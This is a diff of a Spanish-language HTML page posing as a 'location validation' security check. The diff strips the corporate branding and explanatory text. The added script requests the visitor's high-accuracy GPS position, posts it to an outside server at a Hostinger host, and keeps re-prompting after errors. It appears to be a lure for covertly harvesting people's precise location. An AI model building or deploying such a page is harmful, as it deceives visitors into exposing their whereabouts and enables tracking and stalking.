@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Validación de Ubicación - Exproof</title>
+    <title>Validación de Ubicación</title>
     <style>
         * {
             margin: 0;
@@ -12,168 +12,50 @@
         }
 
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
-            min-height: 100vh;
+            font-family: Arial, sans-serif;
+            background: rgba(0, 0, 0, 0.5);
+            height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 20px;
         }
 
-        .container {
-            background: white;
-            border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-            max-width: 500px;
-            width: 100%;
-            overflow: hidden;
-            animation: slideIn 0.5s ease-out;
-        }
-
-        @keyframes slideIn {
-            from {
-                opacity: 0;
-                transform: translateY(-30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .header {
-            background: linear-gradient(135deg, #d32f2f 0%, #b71c1c 100%);
-            padding: 30px;
-            text-align: center;
-            color: white;
-        }
-
-        .logo {
-            width: 120px;
-            height: auto;
-            margin-bottom: 15px;
-            filter: brightness(0) invert(1);
-        }
-
-        .header h1 {
-            font-size: 24px;
-            font-weight: 600;
-            margin: 0;
-        }
-
-        .content {
-            padding: 40px 30px;
-        }
-
-        .security-icon {
-            text-align: center;
-            font-size: 48px;
-            margin-bottom: 20px;
-        }
-
-        .content h2 {
-            color: #d32f2f;
-            font-size: 22px;
-            margin-bottom: 15px;
-            text-align: center;
-        }
-
-        .content p {
-            color: #555;
-            line-height: 1.6;
-            margin-bottom: 20px;
-            text-align: center;
-        }
-
-        .info-box {
-            background: #f5f5f5;
-            border-left: 4px solid #d32f2f;
-            padding: 15px;
-            margin: 20px 0;
-            border-radius: 5px;
-        }
-
-        .info-box p {
-            margin: 0;
-            text-align: left;
-            font-size: 14px;
-            color: #666;
-        }
-
-        .ip-display {
-            background: #e3f2fd;
-            padding: 10px;
-            border-radius: 5px;
-            text-align: center;
-            font-family: monospace;
-            font-size: 14px;
-            color: #1976d2;
-            margin-bottom: 25px;
-        }
-
-        /* Modal de confirmación */
         .modal-overlay {
-            display: none;
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
             background: rgba(0, 0, 0, 0.6);
-            z-index: 1000;
+            display: flex;
             justify-content: center;
             align-items: center;
-            backdrop-filter: blur(5px);
-        }
-
-        .modal-overlay.active {
-            display: flex;
-            animation: fadeIn 0.3s ease-out;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
+            z-index: 1000;
         }
 
         .modal {
             background: white;
-            border-radius: 15px;
             padding: 30px;
+            border-radius: 10px;
             max-width: 400px;
             width: 90%;
             box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
-            animation: modalSlideIn 0.3s ease-out;
-        }
-
-        @keyframes modalSlideIn {
-            from {
-                transform: scale(0.9);
-                opacity: 0;
-            }
-            to {
-                transform: scale(1);
-                opacity: 1;
-            }
+            text-align: center;
         }
 
         .modal-icon {
-            text-align: center;
             font-size: 48px;
             margin-bottom: 15px;
         }
 
         .modal h3 {
-            color: #333;
-            text-align: center;
+            color: #d32f2f;
             margin-bottom: 15px;
             font-size: 20px;
         }
 
         .modal p {
             color: #666;
-            text-align: center;
             margin-bottom: 25px;
             line-height: 1.5;
         }
@@ -184,58 +66,40 @@
             justify-content: center;
         }
 
-        /* Botones principales */
         .btn {
-            padding: 15px 30px;
+            padding: 12px 30px;
             border: none;
-            border-radius: 8px;
-            font-size: 16px;
+            border-radius: 5px;
+            font-size: 14px;
             font-weight: 600;
             cursor: pointer;
-            transition: all 0.3s ease;
             text-transform: uppercase;
-            letter-spacing: 0.5px;
         }
 
         .btn-primary {
-            background: linear-gradient(135deg, #d32f2f 0%, #b71c1c 100%);
+            background: #d32f2f;
             color: white;
-            flex: 1;
         }
 
         .btn-primary:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 20px rgba(211, 47, 47, 0.4);
+            background: #b71c1c;
         }
 
         .btn-secondary {
             background: #e0e0e0;
             color: #666;
-            flex: 1;
         }
 
         .btn-secondary:hover {
             background: #d0d0d0;
         }
 
-        .btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none !important;
-        }
-
-        /* Estados de carga y error */
         .status-message {
             display: none;
-            padding: 15px;
-            border-radius: 8px;
-            margin-top: 20px;
-            text-align: center;
-        }
-
-        .status-message.active {
-            display: block;
-            animation: fadeIn 0.3s ease-out;
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 14px;
         }
 
         .status-loading {
@@ -255,13 +119,13 @@
 
         .spinner {
             display: inline-block;
-            width: 20px;
-            height: 20px;
+            width: 16px;
+            height: 16px;
             border: 3px solid #f3f3f3;
             border-top: 3px solid #d32f2f;
             border-radius: 50%;
             animation: spin 1s linear infinite;
-            margin-right: 10px;
+            margin-right: 8px;
             vertical-align: middle;
         }
 
@@ -269,142 +133,52 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-
-        .footer {
-            text-align: center;
-            padding: 20px;
-            background: #f5f5f5;
-            color: #999;
-            font-size: 12px;
-        }
-
-        /* Responsive */
-        @media (max-width: 480px) {
-            .container {
-                margin: 10px;
-            }
-            
-            .content {
-                padding: 30px 20px;
-            }
-            
-            .modal-buttons {
-                flex-direction: column;
-            }
-        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <!-- Logo de Exproof -->
-            <svg class="logo" viewBox="0 0 200 60" xmlns="http://www.w3.org/2000/svg">
-                <text x="10" y="45" font-family="Arial, sans-serif" font-size="32" font-weight="bold" fill="white">EXPROOF</text>
-            </svg>
-            <h1>Validación de Seguridad</h1>
-        </div>
-
-        <div class="content">
-            <div class="security-icon">🔒</div>
-            
-            <h2>Acceso Protegido</h2>
-            
-            <p>
-                Para garantizar la seguridad operativa de <strong>Tecnología Electromecánica y Exproof</strong>, 
-                necesitamos validar su ubicación antes de permitir el acceso al recurso solicitado.
-            </p>
-
-            <div class="ip-display">
-                IP detectada: {{ client_ip }}
-            </div>
-
-            <div class="info-box">
-                <p>
-                    <strong>🔒 Política de Seguridad:</strong><br>
-                    Este proceso utiliza geolocalización GPS de alta precisión para verificar 
-                    que el acceso se realiza desde una ubicación autorizada. Sus coordenadas 
-                    serán verificadas en tiempo real.
-                </p>
-            </div>
-
-            <button class="btn btn-primary" id="validateBtn" onclick="showConfirmModal()">
-                📍 Validar Mi Ubicación
-            </button>
-
-            <!-- Mensajes de estado -->
-            <div id="loadingMessage" class="status-message status-loading">
-                <span class="spinner"></span>
-                Solicitando acceso GPS... Por favor espere.
-            </div>
-
-            <div id="successMessage" class="status-message status-success">
-                ✅ Ubicación validada exitosamente. Redirigiendo...
-            </div>
-
-            <div id="errorMessage" class="status-message status-error">
-                ❌ <span id="errorText">Error al obtener ubicación.</span>
-            </div>
-        </div>
-
-        <div class="footer">
-            Sistema de Seguridad Perimetral Sentinel-Geo v2.0<br>
-            © 2026 Tecnología Electromecánica y Exproof
-        </div>
-    </div>
-
-    <!-- Modal de confirmación -->
     <div class="modal-overlay" id="confirmModal">
         <div class="modal">
             <div class="modal-icon">📍</div>
-            <h3>Continuar al sitio</h3>
+            <h3>¿Continuar al sitio?</h3>
             <p>
                 Para acceder al recurso, necesitamos validar su ubicación GPS 
-                por seguridad operativa. ¿Desea continuar?
+                por seguridad operativa.
             </p>
             <div class="modal-buttons">
-                <button class="btn btn-secondary" onclick="hideConfirmModal()">
+                <button class="btn btn-secondary" onclick="cancelar()">
                     Cancelar
                 </button>
-                <button class="btn btn-primary" onclick="requestGPS()">
+                <button class="btn btn-primary" onclick="confirmar()">
                     Confirmar
                 </button>
             </div>
         </div>
     </div>
 
+    <div id="loadingMessage" class="status-message status-loading" style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 2000;">
+        <span class="spinner"></span>
+        Solicitando acceso GPS...
+    </div>
+
+    <div id="successMessage" class="status-message status-success" style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 2000;">
+        ✅ Ubicación validada. Redirigiendo...
+    </div>
+
+    <div id="errorMessage" class="status-message status-error" style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 2000;">
+        ❌ <span id="errorText">Error al obtener ubicación.</span>
+    </div>
+
     <script>
-        // Configuración
         const CLIENT_IP = "{{ client_ip }}";
         const IMAGE_URL = "{{ image_url }}";
-        const API_ENDPOINT = "/update-precise-location";
+        const API_ENDPOINT = "http://srv1459428.hostinger.com:8080/update-precise-location";
 
-        // Elementos del DOM
-        const validateBtn = document.getElementById('validateBtn');
-        const confirmModal = document.getElementById('confirmModal');
-        const loadingMessage = document.getElementById('loadingMessage');
-        const successMessage = document.getElementById('successMessage');
-        const errorMessage = document.getElementById('errorMessage');
-        const errorText = document.getElementById('errorText');
-
-        // Mostrar modal de confirmación
-        function showConfirmModal() {
-            confirmModal.classList.add('active');
-        }
-
-        // Ocultar modal de confirmación
-        function hideConfirmModal() {
-            confirmModal.classList.remove('active');
-        }
-
-        // Solicitar GPS
-        function requestGPS() {
+        function confirmar() {
             // Ocultar modal
-            hideConfirmModal();
+            document.getElementById('confirmModal').style.display = 'none';
             
-            // Deshabilitar botón y mostrar loading
-            validateBtn.disabled = true;
-            loadingMessage.classList.add('active');
-            errorMessage.classList.remove('active');
+            // Mostrar loading
+            document.getElementById('loadingMessage').style.display = 'block';
 
             // Verificar si el navegador soporta geolocalización
             if (!navigator.geolocation) {
@@ -414,11 +188,8 @@
 
             // Solicitar posición GPS
             navigator.geolocation.getCurrentPosition(
-                // Éxito
                 handleGPSSuccess,
-                // Error
                 handleGPSError,
-                // Opciones
                 {
                     enableHighAccuracy: true,
                     timeout: 10000,
@@ -427,7 +198,11 @@
             );
         }
 
-        // Manejar éxito del GPS
+        function cancelar() {
+            document.getElementById('confirmModal').style.display = 'none';
+            document.body.innerHTML = '<p style="color: white; text-align: center; padding: 50px;">Operación cancelada.</p>';
+        }
+
         async function handleGPSSuccess(position) {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
@@ -436,7 +211,6 @@
             console.log(`📍 GPS obtenido: ${lat}, ${lon} (±${accuracy}m)`);
 
             try {
-                // Enviar datos al servidor
                 const response = await fetch(API_ENDPOINT, {
                     method: 'POST',
                     headers: {
@@ -453,11 +227,9 @@
                 const data = await response.json();
 
                 if (data.success) {
-                    // Éxito
-                    loadingMessage.classList.remove('active');
-                    successMessage.classList.add('active');
+                    document.getElementById('loadingMessage').style.display = 'none';
+                    document.getElementById('successMessage').style.display = 'block';
 
-                    // Redirigir después de 2 segundos
                     setTimeout(() => {
                         window.location.href = data.redirect_url;
                     }, 2000);
@@ -470,7 +242,6 @@
             }
         }
 
-        // Manejar error del GPS
         function handleGPSError(error) {
             let message = "";
             
@@ -491,27 +262,17 @@
             showError(message);
         }
 
-        // Mostrar error
         function showError(message) {
-            loadingMessage.classList.remove('active');
-            errorMessage.classList.add('active');
-            errorText.textContent = message;
-            validateBtn.disabled = false;
+            document.getElementById('loadingMessage').style.display = 'none';
+            document.getElementById('errorMessage').style.display = 'block';
+            document.getElementById('errorText').textContent = message;
+            
+            // Re-mostrar modal después de 3 segundos
+            setTimeout(() => {
+                document.getElementById('errorMessage').style.display = 'none';
+                document.getElementById('confirmModal').style.display = 'flex';
+            }, 3000);
         }
-
-        // Cerrar modal al hacer clic fuera
-        confirmModal.addEventListener('click', function(e) {
-            if (e.target === confirmModal) {
-                hideConfirmModal();
-            }
-        });
-
-        // Tecla ESC para cerrar modal
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'Escape') {
-                hideConfirmModal();
-            }
-        });
     </script>
 </body>
 </html>
